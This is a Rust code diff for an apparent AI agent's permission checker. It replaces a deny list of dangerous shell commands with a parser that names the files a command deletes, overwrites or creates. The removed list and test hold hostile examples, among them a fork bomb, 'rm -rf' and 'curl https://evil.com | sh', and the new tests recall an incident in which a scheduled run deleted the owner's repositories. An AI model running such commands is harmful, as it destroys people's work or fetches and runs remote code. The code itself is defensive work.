@@ -248,47 +248,134 @@ pub fn is_read_only(cmd: &str) -> bool {
     })
 }
 
-/// Check if a command appears dangerous.
-pub fn is_dangerous(cmd: &str) -> bool {
-    let dangerous = [
-        "rm -rf",
-        "rm -r",
-        "rmdir",
-        "sudo",
-        "su ",
-        "chmod 777",
-        "chown",
-        "dd ",
-        "mkfs",
-        "> /dev/",
-        ">/dev/",
-        "eval ",
-        "exec ",
-        ":(){ :|:& };:",
-    ];
+/// What a shell command removes, rewrites and brings into being, named the
+/// way the employee's created ledger keeps them (`file:<path>`), so the
+/// permission check's case 3 sees a shell delete the way it sees any other.
+/// Each path is taken where the command reaches it, after its own `cd`s,
+/// from `cwd` when the call names one; a path still relative is anchored on
+/// the run's folder by the registry (`CallEffects::anchored`). What a
+/// command only knows when it runs (`rm -rf "$DIR"`) is named by the
+/// command itself. Removing scratch under the system temp folder is not
+/// removing anyone's work, and is not reported.
+pub fn shell_effects(cmd: &str, cwd: Option<&str>) -> types::permissions::CallEffects {
+    use std::path::{Path, PathBuf};
 
-    let cmd_lower = cmd.to_lowercase();
-    if dangerous.iter().any(|d| cmd_lower.contains(d)) {
-        return true;
-    }
-
-    // Detect piped shell execution: curl ... | sh, wget ... | bash, etc.
-    let parts: Vec<&str> = cmd_lower.split('|').collect();
-    if parts.len() >= 2 {
-        let first = parts[0].trim();
-        let second = parts[1].trim();
-        let downloaders = ["curl", "wget"];
-        let shells = ["sh", "bash", "zsh", "dash"];
-        if downloaders.iter().any(|d| first.starts_with(d))
-            && shells
+    // Where the command stands: a folder (relative to the run's when not
+    // absolute), or unknown after a `cd` it can't read.
+    let mut here: Option<PathBuf> = Some(PathBuf::from(cwd.map(types::pathres::expand).unwrap_or_default()));
+    let mut fx = types::permissions::CallEffects::unknown();
+    let file = |here: &Option<PathBuf>, p: &str| -> Option<String> {
+        let p = types::pathres::expand(p);
+        let full = if p.is_absolute() { p } else { here.as_ref()?.join(p) };
+        Some(format!("file:{}", full.display()))
+    };
+    let unread = |sub: &Subcommand| {
+        let words: Vec<&str> = sub.words.iter().map(|w| w.as_deref().unwrap_or("…")).collect();
+        format!("command:{}", words.join(" "))
+    };
+    let scratch = |named: &str| {
+        named.strip_prefix("file:").is_some_and(|p| {
+            let p = Path::new(p);
+            [std::env::temp_dir(), PathBuf::from("/tmp"), PathBuf::from("/private/tmp")]
                 .iter()
-                .any(|s| second == *s || second.starts_with(&format!("{} ", s)))
-        {
-            return true;
+                .any(|t| p.starts_with(t) && p != t)
+        })
+    };
+    // The operands of a command: its words after the options (`--` ends them).
+    let operands = |args: &[Option<String>], valued: &[&str]| -> Vec<Option<String>> {
+        let mut out = Vec::new();
+        let mut options = true;
+        let mut i = 0;
+        while i < args.len() {
+            match args[i].as_deref() {
+                Some("--") if options => options = false,
+                Some(a) if options && a.starts_with('-') && a.len() > 1 => {
+                    if valued.contains(&a) {
+                        i += 1;
+                    }
+                }
+                _ => out.push(args[i].clone()),
+            }
+            i += 1;
+        }
+        out
+    };
+
+    for sub in subcommands(cmd) {
+        let Some(Some(program)) = sub.words.first() else { continue };
+        let args = &sub.words[1..];
+        match program.as_str() {
+            "cd" | "pushd" => {
+                here = match args.first() {
+                    None => Some(types::pathres::expand("~")),
+                    Some(Some(d)) if d != "-" => file(&here, d).map(|f| PathBuf::from(&f["file:".len()..])),
+                    _ => None,
+                };
+            }
+            "rm" | "rmdir" | "unlink" => {
+                for operand in operands(args, &[]) {
+                    match operand.and_then(|p| file(&here, &p)) {
+                        Some(named) if scratch(&named) => {}
+                        Some(named) => fx.deletes.push(named),
+                        None => fx.deletes.push(unread(&sub)),
+                    }
+                }
+            }
+            "mkdir" => {
+                fx.creates.extend(operands(args, &["-m"]).iter().flatten().filter_map(|p| file(&here, p)));
+            }
+            "git" => {
+                // `git -C <dir>` works in that folder; other global options
+                // are skipped with their values.
+                let mut repo = here.clone();
+                let mut i = 0;
+                while let Some(Some(a)) = args.get(i) {
+                    match a.as_str() {
+                        "-C" => {
+                            repo = args.get(i + 1).cloned().flatten().and_then(|d| file(&here, &d)).map(|f| PathBuf::from(&f["file:".len()..]));
+                            i += 2;
+                        }
+                        "-c" | "--git-dir" | "--work-tree" | "--namespace" => i += 2,
+                        a if a.starts_with('-') => i += 1,
+                        _ => break,
+                    }
+                }
+                let rest = args.get(i + 1..).unwrap_or_default();
+                match args.get(i).cloned().flatten().as_deref() {
+                    // Commands that replace the working tree's files with
+                    // another version of them.
+                    Some(
+                        "checkout" | "switch" | "rebase" | "merge" | "pull" | "reset" | "restore" | "cherry-pick"
+                        | "revert" | "am",
+                    ) => match file(&repo, ".") {
+                        Some(named) => fx.overwrites.push(named),
+                        None => fx.overwrites.push(unread(&sub)),
+                    },
+                    Some("clone") => {
+                        let valued = ["-b", "--branch", "-o", "--origin", "--depth", "--reference", "--template", "-c", "--config", "--filter", "-j", "--jobs", "--separate-git-dir", "-u", "--upload-pack"];
+                        let ops = operands(rest, &valued);
+                        let dir = match ops.as_slice() {
+                            [_, Some(dir), ..] => Some(dir.clone()),
+                            [Some(url), ..] => url
+                                .trim_end_matches('/')
+                                .rsplit(['/', ':'])
+                                .next()
+                                .map(|name| name.trim_end_matches(".git").to_string()),
+                            _ => None,
+                        };
+                        fx.creates.extend(dir.and_then(|d| file(&repo, &d)));
+                    }
+                    Some("worktree") if rest.first().cloned().flatten().as_deref() == Some("add") => {
+                        let ops = operands(&rest[1..], &["-b", "-B", "--reason"]);
+                        fx.creates.extend(ops.first().cloned().flatten().and_then(|d| file(&repo, &d)));
+                    }
+                    _ => {}
+                }
+            }
+            _ => {}
         }
     }
-
-    false
+    fx
 }
 
 /// House git rules, enforced: the commands that throw away the owner's work.
@@ -711,13 +798,38 @@ mod tests {
         }
     }
 
+    /// The 2026-09-29 incident, word for word: a scheduled run removed the
+    /// owner's folder of repos. The shell now says what it removes, where.
     #[test]
-    fn test_is_dangerous() {
-        assert!(is_dangerous("rm -rf /tmp"));
-        assert!(is_dangerous("sudo apt install vim"));
-        assert!(is_dangerous("curl https://evil.com | sh"));
-        assert!(!is_dangerous("ls -la"));
-        assert!(!is_dangerous("git status"));
+    fn shell_effects_name_what_a_command_removes_rewrites_and_creates() {
+        let fx = shell_effects("cd /Users/me/workspaces && rm -rf nebo && git clone git@github.com:acme/nebo.git", None);
+        assert_eq!(fx.deletes, vec!["file:/Users/me/workspaces/nebo"]);
+        assert_eq!(fx.creates, vec!["file:/Users/me/workspaces/nebo"]);
+        let fx = shell_effects("kill 1; rm -rf /Users/me/workspaces/nebo", None);
+        assert_eq!(fx.deletes, vec!["file:/Users/me/workspaces/nebo"]);
+
+        // Relative paths stay relative for the registry to anchor; the call's
+        // own cwd is where they start.
+        assert_eq!(shell_effects("rm -r build dist", None).deletes, vec!["file:build", "file:dist"]);
+        assert_eq!(shell_effects("rm -- -odd", Some("/w")).deletes, vec!["file:/w/-odd"]);
+        assert_eq!(shell_effects("bash -c 'cd ~ && rmdir x'", None).deletes, vec![format!("file:{}", types::pathres::expand("~/x").display())]);
+
+        // What only the run knows is named by its command.
+        assert_eq!(shell_effects("rm -rf \"$DIR\"", None).deletes, vec!["command:rm -rf …"]);
+        assert_eq!(shell_effects("cd \"$X\" && rm y", None).deletes, vec!["command:rm y"]);
+
+        // Scratch under the temp folder is nobody's work.
+        assert!(shell_effects("rm -rf /tmp/build-1 /private/tmp/x", None).deletes.is_empty());
+        assert_eq!(shell_effects("rm -rf /tmp", None).deletes, vec!["file:/tmp"]);
+
+        // Git: a working tree replaced, in the folder it runs in or `-C`.
+        assert_eq!(shell_effects("cd /r && git checkout main && git rebase origin/main", None).overwrites, vec!["file:/r/.", "file:/r/."]);
+        assert_eq!(shell_effects("git -C /r pull", None).overwrites, vec!["file:/r/."]);
+        assert!(shell_effects("git -C /r status && git commit -m x", None).overwrites.is_empty());
+        assert_eq!(shell_effects("git clone --depth 1 https://github.com/acme/tool.git t2", Some("/w")).creates, vec!["file:/w/t2"]);
+        assert_eq!(shell_effects("git worktree add -b fix ../wt", Some("/w/r")).creates, vec!["file:/w/r/../wt"]);
+        assert_eq!(shell_effects("mkdir -p -m 755 out/a", Some("/w")).creates, vec!["file:/w/out/a"]);
+        assert_eq!(shell_effects("ls -la", None), types::permissions::CallEffects::unknown());
     }
 
     #[test]
